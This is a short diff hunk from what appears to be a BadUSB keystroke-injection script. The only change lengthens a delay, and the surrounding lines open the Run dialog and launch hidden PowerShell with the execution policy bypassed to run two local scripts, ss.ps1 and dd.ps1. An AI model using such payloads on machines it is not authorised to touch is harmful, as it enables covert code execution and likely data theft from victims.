@@ -12,6 +12,6 @@ DELAY 200
 STRING powershell -w h -NoP -NonI -ep Bypass D:\ss.ps1 -WindowStyle Hidden
 ENTER
 GUI r
-DELAY 500
+DELAY 1000
 STRING powershell -w h -NoP -NonI -ep Bypass D:\dd.ps1 -WindowStyle Hidden
 ENTER
